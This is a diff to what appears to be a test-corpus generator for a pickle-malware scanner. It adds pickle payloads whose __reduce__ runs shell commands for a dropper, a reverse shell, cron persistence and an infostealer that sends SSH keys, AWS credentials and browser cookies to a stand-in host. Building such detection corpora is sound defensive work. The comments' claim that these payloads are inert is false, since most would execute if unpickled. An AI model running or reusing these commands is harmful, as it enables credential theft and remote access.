@@ -99,6 +99,57 @@ class _Connect:
         return (socket.socket, ())
 
 
+# --- realistic (still inert) malware-behavior payloads ------------------
+# Each reproduces the calls + indicator strings of a malware class. The
+# reachable command is harmless, but the URLs/paths/markers are what a real
+# sample of that class would carry, so behavior classification has something
+# concrete to key on.
+
+class _Dropper:
+    """Downloader: fetch a remote stage and run it via the shell."""
+    def __reduce__(self):
+        import os
+        return (os.system,
+                ("curl http://185.220.101.4/stage2.sh | bash",))
+
+
+class _RevShell:
+    """Reverse shell over bash /dev/tcp."""
+    def __reduce__(self):
+        import os
+        return (os.system,
+                ("bash -c 'bash -i >& /dev/tcp/10.0.0.6/4444 0>&1'",))
+
+
+class _InfoStealer:
+    """Reads SSH + AWS + browser secrets, exfiltrates over HTTP."""
+    def __reduce__(self):
+        import os
+        cmd = ("tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials "
+               "'~/Library/Application Support/Google/Chrome/Default/Cookies' "
+               "&& curl -F f=@/tmp/loot.tgz https://exfil.evil-corp.top/u")
+        return (os.system, (cmd,))
+
+
+class _Ransomware:
+    """Destructive: encrypt+rename files and drop a ransom note with a BTC
+    address. Inert - the command only echoes."""
+    def __reduce__(self):
+        import os
+        note = ("echo 'Your files have been encrypted. Pay 0.5 BTC to "
+                "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh to decrypt' "
+                "> /tmp/READ_ME.locked.txt")
+        return (os.system, (note,))
+
+
+class _Persistence:
+    """Adds a cron job for persistence."""
+    def __reduce__(self):
+        import os
+        return (os.system,
+                ("(crontab -l; echo '@reboot /tmp/.x') | crontab -",))
+
+
 def _alias_payload() -> bytes:
     """GLOBAL naming posix.system directly - bypasses an 'os.system' blocklist.
 
@@ -257,6 +308,7 @@ def _add(name: str, data: bytes, malicious: bool, family: str,
 
 def build() -> list[dict]:
     SAMPLES.mkdir(exist_ok=True)
+    MANIFEST.clear()  # idempotent: repeated calls in one process must not stack
 
     _add("mal_direct.pkl", pickle.dumps(_Direct()), True, "direct")
     _add("mal_eval.pkl", pickle.dumps(_Eval()), True, "direct")
@@ -274,6 +326,13 @@ def build() -> list[dict]:
     _add("mal_unlisted_reflection.pkl", _unlisted_reflection_payload(),
          True, "unlisted_reflection")
     _add("mal_marshal.pkl", _marshal_payload(), True, "unlisted_marshal")
+
+    # Malware-behavior corpus (inert; carry realistic indicator strings).
+    _add("mal_dropper.pkl", pickle.dumps(_Dropper()), True, "dropper")
+    _add("mal_revshell.pkl", pickle.dumps(_RevShell()), True, "c2")
+    _add("mal_infostealer.pkl", pickle.dumps(_InfoStealer()), True, "infostealer")
+    _add("mal_ransomware.pkl", pickle.dumps(_Ransomware()), True, "ransomware")
+    _add("mal_persistence.pkl", pickle.dumps(_Persistence()), True, "persistence")
 
     _add("benign_dict.pkl", _benign_dict(), False, "benign")
     _add("benign_nested.pkl", _benign_nested_list(), False, "benign")
